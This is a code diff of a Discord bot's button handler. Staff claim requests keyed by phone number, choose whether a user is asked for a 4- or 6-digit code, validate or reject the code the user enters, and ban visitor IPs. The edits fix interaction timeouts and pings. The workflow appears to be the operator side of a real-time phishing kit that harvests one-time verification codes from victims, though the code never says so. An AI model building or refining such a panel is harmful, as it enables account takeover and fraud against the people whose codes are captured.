@@ -1,15 +1,40 @@
 /**
- * buttons.js — Discord button interaction handler  (v2.3)
+ * buttons.js — Discord button interaction handler  (v2.5)
+ *
+ * v2.5 — Interaction-safety pass (fixes "Unknown interaction" / 10062 crashes):
+ *  - `deferReply`/`editReply`/`reply` are now ALWAYS wrapped (safeDefer /
+ *    safeReply) instead of bare `await`. Previously a bare
+ *    `await interaction.deferReply(...)` sat OUTSIDE any try/catch — if the
+ *    interaction token had already expired (Discord gateway lag, a slow DB
+ *    call, or just staff mashing the same button), that throw was uncaught
+ *    at that call site and surfaced as a scary top-level "Interaction error"
+ *    from bot.js, without ever running the actual action.
+ *  - Moved the claimer-only permission check (`getUnauthorizedClaimer`, which
+ *    can hit the DB) to run AFTER deferring instead of before. Previously the
+ *    DB round-trip happened first and ate into the interaction's 3-second ack
+ *    window — under any DB latency this alone could cause the token to expire
+ *    before we ever got to `deferReply`. Now we ack immediately (in-memory,
+ *    no network) and do the slower permission check afterwards.
+ *  - Added an in-memory fast-path on "claim": if we already know (from the
+ *    local claimStore) that someone else holds it, we reply immediately
+ *    without a wasted round-trip to the API — avoids racing multiple staff
+ *    clicks against the backend when the answer is already known locally.
+ *  - Claimer resolution goes through the shared claimStore (utils/claimStore.js)
+ *    instead of a separate local Map — polling.js uses the exact same store.
+ *
+ * v2.4 — Ping routing:
+ *  - New request (sent from polling.js) pings the @access role.
+ *  - Every embed after that (claimed, len4/6, wrong, false code, true code)
+ *    explicitly pings the claimer in `content`.
+ *  - Unclaim resets back to "unclaimed" — content pings @access again since
+ *    it's back in the pool for anyone to grab.
  *
  * v2.3 — False code flow overhaul:
- *  OLD: falsecode → edit message "refused" → send NEW embed with True/False buttons
- *  NEW: falsecode → edit message IN-PLACE back to [4/6 digits · Wrong · Unclaim]
- *       so staff immediately picks the new code length without a second embed.
- *       User is redirected back to validation.html (waiting for new length) via
- *       verify-wait.js detecting retry_code status.
+ *  falsecode → edit message IN-PLACE back to [4/6 digits · Wrong · Unclaim]
+ *  instead of sending a brand new embed.
  *
  * v2.2: claimer-only buttons (in-memory + DB fallback after restart)
- * v2.1: len4/len6 length param, sendRetryEmbed defined, unclaim restores Claim button,
+ * v2.1: len4/len6 length param, unclaim restores Claim button,
  *        double-claim protection, fetch timeout, unclaim logging.
  */
 
@@ -17,15 +42,56 @@ import {
     ButtonBuilder, ButtonStyle,
     ActionRowBuilder, EmbedBuilder,
 } from "discord.js";
-import { CONFIG }                            from "../config.js";
-import { getRequestByPhone, getClaimedBy }  from "../database.js";
-import { getOperatorColor }                  from "../utils/colors.js";
-import { formatPhone }                       from "../utils/formatters.js";
-import { buildNewRequestEmbed }             from "../utils/embedBuilder.js";
-import { callStaffAction, callBanIP }       from "../utils/api.js";
+import { CONFIG }                                       from "../config.js";
+import { getRequestByPhone }                             from "../database.js";
+import { getOperatorColor }                               from "../utils/colors.js";
+import { formatPhone }                                    from "../utils/formatters.js";
+import { callStaffAction, callBanIP }                    from "../utils/api.js";
+import { setClaimer, clearClaimer, getClaimer, peekClaimer } from "../utils/claimStore.js";
 
-// ─── In-memory claimer Map ────────────────────────────────────────────────────
-export const claimedBy = new Map();
+// ─── Interaction-safety helpers ───────────────────────────────────────────────
+
+/**
+ * Defers the interaction (ephemeral) without ever throwing. Returns true if
+ * the defer actually succeeded, false if the token was already dead (expired,
+ * Discord hiccup, etc.) — callers use this to decide whether editReply/reply
+ * can still work, but proceed with the underlying action either way since
+ * that's the user's real intent and the channel embed is the real feedback.
+ */
+async function safeDefer(interaction) {
+    try {
+        await interaction.deferReply({ flags: 64 });
+        return true;
+    } catch (e) {
+        console.warn(`⚠️  Could not defer interaction ${interaction.id} (expired token?):`, e.message);
+        return false;
+    }
+}
+
+/** Replies/edits without ever throwing — no-ops silently if the token is dead. */
+async function safeReply(interaction, deferred, options) {
+    try {
+        if (deferred) {
+            await interaction.editReply(options);
+        } else if (!interaction.replied && !interaction.deferred) {
+            await interaction.reply({ ...options, flags: 64 });
+        }
+    } catch (e) {
+        console.warn(`⚠️  Could not reply to interaction ${interaction.id} (expired?):`, e.message);
+    }
+}
+
+// ─── Ping helpers ──────────────────────────────────────────────────────────────
+
+/** Ping the person who currently holds the claim. */
+function pingUser(userId) {
+    return `<@${userId}>`;
+}
+
+/** Ping the @access role — used when a request is unclaimed/back in the pool. */
+function pingAccessRole() {
+    return `<@&${CONFIG.ACCESS_ROLE_ID}>`;
+}
 
 // ─── Shared button builders ───────────────────────────────────────────────────
 
@@ -60,21 +126,10 @@ async function safeEditMessage(message, options) {
 
 /** Returns the claimer userId if the caller is NOT allowed, or null if allowed. */
 async function getUnauthorizedClaimer(phone, userId) {
-    let claimer = claimedBy.get(phone) ?? null;
-    if (!claimer) {
-        claimer = await getClaimedBy(phone);
-        if (claimer) claimedBy.set(phone, claimer); // restore after restart
-    }
-    if (!claimer)              return null;  // no lock → allow
-    if (claimer === userId)    return null;  // correct person → allow
-    return claimer;                          // wrong person → deny
-}
-
-async function replyNotYourRequest(interaction, claimer) {
-    await interaction.reply({
-        content: `🔒 This request was claimed by <@${claimer}>.\nOnly they can interact with these buttons.`,
-        flags: 64,
-    });
+    const claimer = await getClaimer(phone);
+    if (!claimer)           return null;  // no lock → allow
+    if (claimer === userId) return null;  // correct person → allow
+    return claimer;                       // wrong person → deny
 }
 
 /**
@@ -92,7 +147,7 @@ async function replyNotYourRequest(interaction, claimer) {
  *      rewrite it in place to reflect reality so nobody else hits the same
  *      wall.
  */
-async function handleFailedClaim(interaction, phone, apiMessage) {
+async function handleFailedClaim(interaction, deferred, phone, apiMessage) {
     let row = null;
     try { row = await getRequestByPhone(phone); } catch (e) { console.warn("⚠️  Could not re-check request after failed claim:", e.message); }
 
@@ -100,29 +155,31 @@ async function handleFailedClaim(interaction, phone, apiMessage) {
 
     // Self-heal: our own claim actually went through, we just didn't hear back in time.
     if (realClaimer === interaction.user.id) {
-        claimedBy.set(phone, interaction.user.id);
-        await interaction.editReply({ content: `✅ Request **${formatPhone(phone)}** claimed by <@${interaction.user.id}>` });
+        setClaimer(phone, interaction.user.id);
+        await safeReply(interaction, deferred, { content: `✅ Request **${formatPhone(phone)}** claimed by <@${interaction.user.id}>` });
         const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
             .setColor(getOperatorColor(row?.operator))
             .setTitle("📋 Request In Progress")
             .setDescription(`👤 Claimed by <@${interaction.user.id}>\n⏰ Claimed: <t:${Math.floor(Date.now() / 1000)}:R>\n\n**🔧 Choose an action:**`);
         await safeEditMessage(interaction.message, {
+            content:    pingUser(interaction.user.id),
             embeds:     [newEmbed],
             components: [buildPostClaimRow(phone, row?.ip_address)],
         });
         return;
     }
 
-    await interaction.editReply({ content: "❌ " + (apiMessage || "Already claimed by someone else.") });
+    await safeReply(interaction, deferred, { content: "❌ " + (apiMessage || "Already claimed by someone else.") });
 
     // Refresh the stale embed so future clicks don't repeat the same failure.
     if (row && realClaimer) {
-        claimedBy.set(phone, realClaimer);
+        setClaimer(phone, realClaimer);
         const staleEmbed = EmbedBuilder.from(interaction.message.embeds[0])
             .setColor(getOperatorColor(row.operator))
             .setTitle("📋 Request In Progress")
             .setDescription(`👤 Already claimed by <@${realClaimer}>\n\n**🔧 Choose an action:**`);
         await safeEditMessage(interaction.message, {
+            content:    pingUser(realClaimer),
             embeds:     [staleEmbed],
             components: [buildPostClaimRow(phone, row.ip_address)],
         });
@@ -132,7 +189,7 @@ async function handleFailedClaim(interaction, phone, apiMessage) {
             .setColor(0x6b7280)
             .setTitle("⚠️ Request No Longer Available")
             .setDescription(`This request's status is now **${row.status}** — it can no longer be claimed here.`);
-        await safeEditMessage(interaction.message, { embeds: [staleEmbed], components: [] });
+        await safeEditMessage(interaction.message, { content: "", embeds: [staleEmbed], components: [] });
     }
 }
 
@@ -147,16 +204,28 @@ export async function handleButton(interaction) {
     // ─── CLAIM ────────────────────────────────────────────────────────────────
     if (action === "claim") {
         const phone = payload;
-        await interaction.deferReply({ flags: 64 });
+
+        // Fast-path: if the local claimStore already knows someone else holds
+        // this phone, skip the round-trip to the API entirely — the answer
+        // is already known, so there's no reason to spend part of the
+        // interaction's ack window (or the API's time) confirming it.
+        const knownClaimer = peekClaimer(phone);
+        const deferred = await safeDefer(interaction);
+
+        if (knownClaimer && knownClaimer !== interaction.user.id) {
+            await safeReply(interaction, deferred, { content: `🔒 Already claimed by <@${knownClaimer}>.` });
+            return;
+        }
+
         try {
             const data = await callStaffAction("claim", phone, interaction.user.tag, null, interaction.user.id);
             if (!data.success) {
-                await handleFailedClaim(interaction, phone, data.message);
+                await handleFailedClaim(interaction, deferred, phone, data.message);
                 return;
             }
 
-            claimedBy.set(phone, interaction.user.id);
-            await interaction.editReply({ content: `✅ Request **${formatPhone(phone)}** claimed by <@${interaction.user.id}>` });
+            setClaimer(phone, interaction.user.id);
+            await safeReply(interaction, deferred, { content: `✅ Request **${formatPhone(phone)}** claimed by <@${interaction.user.id}>` });
 
             const row      = await getRequestByPhone(phone);
             const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
@@ -165,18 +234,18 @@ export async function handleButton(interaction) {
                 .setDescription(`👤 Claimed by <@${interaction.user.id}>\n⏰ Claimed: <t:${Math.floor(Date.now() / 1000)}:R>\n\n**🔧 Choose an action:**`);
 
             await safeEditMessage(interaction.message, {
+                content:    pingUser(interaction.user.id),
                 embeds:     [newEmbed],
                 components: [buildPostClaimRow(phone, row?.ip_address)],
             });
         } catch (e) {
-            // A network/timeout error here doesn't necessarily mean the claim
-            // failed server-side — the API client retries transient errors
-            // (see utils/api.js) and the very first attempt may have gone
-            // through before its response was lost. Self-heal instead of
-            // blindly reporting failure: check who the DB says holds the
-            // claim right now before telling the user it failed.
+            // A genuine network/timeout error here doesn't necessarily mean the
+            // claim failed server-side — the API client retries transient
+            // errors and the very first attempt may have gone through before
+            // its response was lost. Self-heal instead of blindly reporting
+            // failure: check who the DB says holds the claim right now.
             console.error("Claim error:", e);
-            await handleFailedClaim(interaction, phone, "Network error while claiming.");
+            await handleFailedClaim(interaction, deferred, phone, "Network error while claiming.");
         }
         return;
     }
@@ -184,85 +253,92 @@ export async function handleButton(interaction) {
     // ─── BAN IP ───────────────────────────────────────────────────────────────
     if (action === "banip") {
         const ip = payload;
-        await interaction.deferReply({ flags: 64 });
+        const deferred = await safeDefer(interaction);
         if (!ip || ip === "unknown" || ip === "null") {
-            await interaction.editReply({ content: "❌ Invalid IP." });
+            await safeReply(interaction, deferred, { content: "❌ Invalid IP." });
             return;
         }
         try {
             const data = await callBanIP(ip, interaction.user.tag);
-            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `🚫 IP **${ip}** banned!` });
+            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
+            await safeReply(interaction, deferred, { content: `🚫 IP **${ip}** banned!` });
             const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(0xef4444).setTitle("🔨 IP Banned")
                 .setDescription(`🚫 **${ip}** banned by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
-            await safeEditMessage(interaction.message, { embeds: [bannedEmbed], components: [] });
+            await safeEditMessage(interaction.message, { content: pingUser(interaction.user.id), embeds: [bannedEmbed], components: [] });
         } catch (e) {
             console.error("banip error:", e);
-            await interaction.editReply({ content: "❌ Network error while banning." });
+            await safeReply(interaction, deferred, { content: "❌ Network error while banning." });
         }
         return;
     }
 
-    // ══ CLAIMER-ONLY BUTTONS — check permission first ═════════════════════════
+    // ══ CLAIMER-ONLY BUTTONS ═══════════════════════════════════════════════════
+    // Defer FIRST (fast, in-memory, no network) — THEN do the DB permission
+    // check. Doing it the other way around (as before) let the DB round-trip
+    // eat into the interaction's 3-second ack window, which could expire the
+    // token before we ever got to deferReply.
     const phone     = payload;
+    const deferred  = await safeDefer(interaction);
     const otherUser = await getUnauthorizedClaimer(phone, interaction.user.id);
-    if (otherUser) { await replyNotYourRequest(interaction, otherUser); return; }
+    if (otherUser) {
+        await safeReply(interaction, deferred, {
+            content: `🔒 This request was claimed by <@${otherUser}>.\nOnly they can interact with these buttons.`,
+        });
+        return;
+    }
 
     // ─── 4 CHIFFRES ───────────────────────────────────────────────────────────
     if (action === "len4") {
-        await interaction.deferReply({ flags: 64 });
         try {
             const data = await callStaffAction("set_length", phone, interaction.user.tag, 4);
-            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ **4-digit** code requested for ${formatPhone(phone)}` });
+            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
+            await safeReply(interaction, deferred, { content: `✅ **4-digit** code requested for ${formatPhone(phone)}` });
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(0x10b981).setTitle("⏳ Awaiting Code (4 digits)")
                 .setDescription(`👤 Claimed\n🔢 Requested code: **4 digits**\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n*Waiting for the user to enter it…*`);
-            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("len4 error:", e); await interaction.editReply({ content: "❌ Error." }); }
+            await safeEditMessage(interaction.message, { content: pingUser(interaction.user.id), embeds: [doneEmbed], components: [] });
+        } catch (e) { console.error("len4 error:", e); await safeReply(interaction, deferred, { content: "❌ Error." }); }
         return;
     }
 
     // ─── 6 CHIFFRES ───────────────────────────────────────────────────────────
     if (action === "len6") {
-        await interaction.deferReply({ flags: 64 });
         try {
             const data = await callStaffAction("set_length", phone, interaction.user.tag, 6);
-            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ **6-digit** code requested for ${formatPhone(phone)}` });
+            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
+            await safeReply(interaction, deferred, { content: `✅ **6-digit** code requested for ${formatPhone(phone)}` });
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(0x10b981).setTitle("⏳ Awaiting Code (6 digits)")
                 .setDescription(`👤 Claimed\n🔢 Requested code: **6 digits**\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\n\n*Waiting for the user to enter it…*`);
-            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("len6 error:", e); await interaction.editReply({ content: "❌ Error." }); }
+            await safeEditMessage(interaction.message, { content: pingUser(interaction.user.id), embeds: [doneEmbed], components: [] });
+        } catch (e) { console.error("len6 error:", e); await safeReply(interaction, deferred, { content: "❌ Error." }); }
         return;
     }
 
     // ─── MAUVAIS NUMÉRO ───────────────────────────────────────────────────────
     if (action === "wrong") {
-        await interaction.deferReply({ flags: 64 });
         try {
             const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
-            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ Wrong number reported for ${formatPhone(phone)}` });
-            claimedBy.delete(phone);
+            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
+            await safeReply(interaction, deferred, { content: `✅ Wrong number reported for ${formatPhone(phone)}` });
+            const reporter = interaction.user.id;
+            clearClaimer(phone);
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(0xef4444).setTitle("❌ Wrong Number")
                 .setDescription(`❌ The user is being redirected to re-enter their number.\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>`);
-            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("wrong error:", e); await interaction.editReply({ content: "❌ Error." }); }
+            await safeEditMessage(interaction.message, { content: pingUser(reporter), embeds: [doneEmbed], components: [] });
+        } catch (e) { console.error("wrong error:", e); await safeReply(interaction, deferred, { content: "❌ Error." }); }
         return;
     }
 
     // ─── UNCLAIM ──────────────────────────────────────────────────────────────
     if (action === "unclaim") {
-        await interaction.deferReply({ flags: 64 });
         try {
             const data = await callStaffAction("unclaim", phone, interaction.user.tag);
-            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            claimedBy.delete(phone);
-            await interaction.editReply({ content: `↩️ Request **${formatPhone(phone)}** unclaimed. Back in the queue.` });
+            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
+            clearClaimer(phone);
+            await safeReply(interaction, deferred, { content: `↩️ Request **${formatPhone(phone)}** unclaimed. Back in the queue.` });
 
             const row    = await getRequestByPhone(phone);
             const reclaimBtn = new ButtonBuilder()
@@ -273,44 +349,44 @@ export async function handleButton(interaction) {
             const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(0x6b7280).setTitle("📭 Request Unclaimed")
                 .setDescription(`↩️ Unclaimed by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nBack in the waiting queue.`);
+            // Back in the pool for anyone to grab — ping @access again, like a new request.
             await safeEditMessage(interaction.message, {
+                content:    pingAccessRole(),
                 embeds:     [unclaimedEmbed],
                 components: [new ActionRowBuilder().addComponents(...btns)],
             });
-        } catch (e) { console.error("unclaim error:", e); await interaction.editReply({ content: "❌ Error." }); }
+        } catch (e) { console.error("unclaim error:", e); await safeReply(interaction, deferred, { content: "❌ Error." }); }
         return;
     }
 
     // ─── TRUE CODE ────────────────────────────────────────────────────────────
     if (action === "truecode") {
-        await interaction.deferReply({ flags: 64 });
         try {
             const data = await callStaffAction("true_code", phone, interaction.user.tag);
-            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
-            await interaction.editReply({ content: `✅ Code validated for ${formatPhone(phone)} 🎉` });
-            claimedBy.delete(phone);
+            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
+            await safeReply(interaction, deferred, { content: `✅ Code validated for ${formatPhone(phone)} 🎉` });
+            const validator = interaction.user.id;
+            clearClaimer(phone);
             const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                 .setColor(0x10b981).setTitle("✅ Code Validated!")
                 .setDescription(`👤 Validated by <@${interaction.user.id}>\n⏰ <t:${Math.floor(Date.now() / 1000)}:R>\nThe user is being redirected to the success page.`);
-            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
-        } catch (e) { console.error("truecode error:", e); await interaction.editReply({ content: "❌ Error." }); }
+            await safeEditMessage(interaction.message, { content: pingUser(validator), embeds: [doneEmbed], components: [] });
+        } catch (e) { console.error("truecode error:", e); await safeReply(interaction, deferred, { content: "❌ Error." }); }
         return;
     }
 
     // ─── FALSE CODE ───────────────────────────────────────────────────────────
-    // v2.3 FIX: instead of clearing the embed + sending a NEW retry embed,
-    //           we edit the current message IN-PLACE back to the post-claim buttons
-    //           (4/6 digits · Wrong · Unclaim · Ban IP).
-    //
-    // User side: verify-wait.js detects retry_code → redirects to validation.html?retry=1
-    //            validation.js waits for waiting_code → redirects to code.html with correct length
+    // Edits the message IN-PLACE back to the post-claim buttons (4/6 digits ·
+    // Wrong · Unclaim · Ban IP) instead of sending a brand new embed.
+    // User side: verify-wait.js detects retry_code → redirects to
+    // validation.html?retry=1; validation.js waits for waiting_code →
+    // redirects to code.html with the correct length.
     if (action === "falsecode") {
-        await interaction.deferReply({ flags: 64 });
         try {
             const data = await callStaffAction("false_code", phone, interaction.user.tag);
-            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }
+            if (!data.success) { await safeReply(interaction, deferred, { content: "❌ " + data.message }); return; }
 
-            await interaction.editReply({
+            await safeReply(interaction, deferred, {
                 content: `🔄 Code rejected for ${formatPhone(phone)}.\nChoose a new length — the user will re-enter their code.`,
             });
 
@@ -329,10 +405,11 @@ export async function handleButton(interaction) {
                 );
 
             await safeEditMessage(interaction.message, {
+                content:    pingUser(interaction.user.id),
                 embeds:     [retryEmbed],
                 components: [buildPostClaimRow(phone, row?.ip_address)],
             });
-        } catch (e) { console.error("falsecode error:", e); await interaction.editReply({ content: "❌ Error." }); }
+        } catch (e) { console.error("falsecode error:", e); await safeReply(interaction, deferred, { content: "❌ Error." }); }
         return;
     }
 
